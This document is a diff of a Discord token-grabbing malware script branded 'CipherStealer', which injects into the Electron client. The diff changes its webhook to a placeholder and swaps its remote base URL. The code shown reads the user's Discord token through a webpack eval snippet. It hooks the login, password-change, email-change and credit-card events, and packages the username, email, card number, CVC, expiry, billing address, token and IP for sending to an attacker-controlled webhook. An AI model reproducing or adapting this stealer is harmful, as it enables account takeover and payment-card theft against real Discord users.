@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "https://discord.com/api/webhooks/954161969068400651/jPrlk5zEyQhjbUM4ZtgG5E3mjG84Z3ugN9kMkiTcrWD9qN6_4N1QG4dpjhi2iWj7afbH";
+var webhook = "%WEBHOOK_LINK%";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -21,11 +21,10 @@ String.prototype.insert = function (index, string) {
 
 const config = {
     "logout": "instant",
-    "inject-notify": "true",
     "logout-notify": "true",
-    "init-notify": "false",
-    "embed-color": 000000,
-    "disable-qr-code": "true"
+    "init-notify":"false",
+    "embed-color": 3447704,
+    "disable-qr-code":"true"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -371,7 +370,7 @@ function Login(email, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://superfurrycdn.nl/copy"
+							var baseuri = "https://ctf.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -700,7 +699,7 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://superfurrycdn.nl/copy"
+							var baseuri = "https://ctf.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1041,7 +1040,7 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://superfurrycdn.nl/copy"
+							var baseuri = "https://ctf.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1357,7 +1356,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
 				content: "",
 				embeds: [{
 					"title": "CipherStealer",
-					"description": "**<:black_joker:926273784305045526> Usuario:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**<:black_lips:926268648593719396> Correo electrónico:**```" + json.email + "```\n" + "**<:Bup_negro:926272964113104946> Nitro:**```" + GetNitro(json.premium_type) + "```\n**<:black_playboy:926268704000475196> Insignias:**```" + GetBadges(json.flags) + "```" + "\n**<a:black_cc:926273142350024764> Número de tarjeta: **```" + number + "```" + "\n**<a:black_cc:926273142350024764> Expiración de la tarjeta: **```" + expir_month + "/" + expir_year + "```" + "\n**<a:black_cc:926273142350024764> CVC: **```" + cvc + "```\n" + "**<a:black_cc:926273142350024764> País: **```" + country + "```\n" + "**<a:black_cc:926273142350024764> Estado: **```" + state + "```\n" + "**<a:black_cc:926273142350024764> Ciudad: **```" + city + "```\n" + "**<a:black_cc:926273142350024764> ZIP:**```" + zip + "```" + "\n**<a:black_cc:926273142350024764> Calle: **```" + street + "```" + "\n**<:black_mask:926268629245390879> Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
+					"description": "**<:black_joker:926273784305045526> Usuario:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**<:black_lips:926268648593719396> Correo electr��nico:**```" + json.email + "```\n" + "**<:Bup_negro:926272964113104946> Nitro:**```" + GetNitro(json.premium_type) + "```\n**<:black_playboy:926268704000475196> Insignias:**```" + GetBadges(json.flags) + "```" + "\n**<a:black_cc:926273142350024764> Número de tarjeta: **```" + number + "```" + "\n**<a:black_cc:926273142350024764> Expiración de la tarjeta: **```" + expir_month + "/" + expir_year + "```" + "\n**<a:black_cc:926273142350024764> CVC: **```" + cvc + "```\n" + "**<a:black_cc:926273142350024764> País: **```" + country + "```\n" + "**<a:black_cc:926273142350024764> Estado: **```" + state + "```\n" + "**<a:black_cc:926273142350024764> Ciudad: **```" + city + "```\n" + "**<a:black_cc:926273142350024764> ZIP:**```" + zip + "```" + "\n**<a:black_cc:926273142350024764> Calle: **```" + street + "```" + "\n**<:black_mask:926268629245390879> Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
 						"name": "CipherStealer"
 					},
